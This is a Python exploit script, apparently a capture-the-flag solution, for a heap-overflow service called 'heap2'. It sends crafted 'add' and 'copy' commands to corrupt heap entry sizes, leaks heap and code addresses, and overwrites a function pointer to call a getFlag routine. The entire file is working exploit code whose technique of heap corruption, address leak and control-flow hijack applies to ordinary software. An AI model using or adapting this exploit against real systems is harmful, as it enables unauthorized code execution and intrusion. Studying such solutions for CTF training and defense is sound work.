#! /usr/bin/env python

import sys
from struct import pack
from optparse import OptionParser
from socket import *
import time
import subprocess
import shlex
import struct

def recv_timeout(the_socket, timeout=0.1):
    the_socket.setblocking(0)
    total_data=[];data='';begin=time.time()
    while 1:
        #if you got some data, then break after wait sec
        if total_data and time.time()-begin>timeout:
            break
        #if you got no data at all, wait a little longer
        elif time.time()-begin>timeout*2:
            break
        try:
            data=the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin=time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    return ''.join(total_data)

def print_and_send(s, command):
    s.send(command + "\n")
    sys.stdout.write(command + "\n")
    
def exploit(hostname, port):
    s = socket(AF_INET, SOCK_STREAM)
    try:
        print "[+] Connecting to %s on port %s" % (hostname, port)
        s.connect((hostname, port))
    except:
        print "[+] Connection error"
        sys.exit(1)
        
    sys.stdout.write(recv_timeout(s))

    print_and_send(s, "add " + "A"*8);
    sys.stdout.write(recv_timeout(s))

    print_and_send(s, "add " + "B"*8);
    sys.stdout.write(recv_timeout(s))

    # Insert a long one
    print_and_send(s, "add " + "C"*16 + struct.pack("<I", 50));
    sys.stdout.write(recv_timeout(s))

    # Copy to overwrite the size of the second one
    print_and_send(s, "copy 2 0");
    sys.stdout.write(recv_timeout(s))

    # Read to leak heap address
    print_and_send(s, "show 1");
    output = recv_timeout(s)
    sys.stdout.write(output)    

    # The address of the third entry is here:
    address_2 = struct.unpack("<I", output[20:24])[0]
    print "[+] log_item[2] is found at", hex(address_2)

    # Using gdb to find relative offsets of allocated memory, 
    #   we know that ftable->fp is at address_2-96
    address_ftable_fp_ptr = address_2 - 96
    print "[+] ftable->fp is at", hex(address_ftable_fp_ptr)

    address_0 = address_2 - 0x50
    print "[+] log_item[0] is at", hex(address_0)
    address_1 = address_2 - 0x50 + 32
    print "[+] log_item[1] is at", hex(address_1)

    # Insert a long one
    # We insert 0x01010101 just because fgets stops at \0
    print_and_send(s, "add " 
                   + "D"*16 
                   + struct.pack("<I", 0x01010101)
                   + struct.pack("<I", address_ftable_fp_ptr))
    sys.stdout.write(recv_timeout(s))

    # Copy to overwrite the address of the second one
    print_and_send(s, "copy 3 0");
    sys.stdout.write(recv_timeout(s))

    # Now we need to fix up the 0x01010101

    # This part creates the string in memory
    print_and_send(s, "add " 
                   + "E"*16 
                   + struct.pack("<I", 4))
    sys.stdout.write(recv_timeout(s))

    # Need to insert another string to overwrite the size of log_item[4]

    print_and_send(s, "add " 
                   + "F"*8*4
                   + struct.pack("<I", 5*4))
    sys.stdout.write(recv_timeout(s))

    # Copy to fix it up
    print_and_send(s, "copy 5 3");
    sys.stdout.write(recv_timeout(s))

    print_and_send(s, "copy 4 0");
    sys.stdout.write(recv_timeout(s))

    # Read to leak address of print_log_item function in memory
    print_and_send(s, "show 1");
    output = recv_timeout(s)
    sys.stdout.write(output)    

    address_print_log_item = struct.unpack("<I", output[0:4])[0]
    print "[+] print_log_item is found at", hex(address_print_log_item)

    # Get offset of debug from address of print_log_item
    # $ objdump -D heap2 | grep print_log_item
    # 00000cfe <print_log_item>:
    # $ objdump -D heap2 | grep getFlag
    # 00000d58 <getFlag>:

    offset = 0x00000d58 - 0x00000cfe
    address_debug = address_print_log_item + offset

    # Overwrite function pointer on heap
    print_and_send(s, "add " 
                   + "G"*16 
                   + struct.pack("<I", 0x01010101)
                   + struct.pack("<I", address_ftable_fp_ptr))
    sys.stdout.write(recv_timeout(s))
    
    print_and_send(s, "copy 6 0");
    sys.stdout.write(recv_timeout(s))

    print_and_send(s, "add " + struct.pack("<I", address_debug))
    sys.stdout.write(recv_timeout(s))

    print_and_send(s, "copy 7 1");
    sys.stdout.write(recv_timeout(s))


    #raw_input()
	
    
    # Trigger
    print_and_send(s, "show 0");
    sys.stdout.write("\n\n\nFlag is:")	
    sys.stdout.write(recv_timeout(s))

    # Just to close the terminal nicely
    sys.stdout.write("\n")


if __name__ == "__main__":
    parser = OptionParser("usage: %prog [options]")
    parser.add_option("-H", "--host", dest="hostname", default="127.0.0.1",
                      type="string", help="Target to run against")
    parser.add_option("-p", "--port", dest="portnum", default=1234,
                      type="int", help="Target port")

    (options, args) = parser.parse_args()

    exploit(options.hostname, options.portnum)
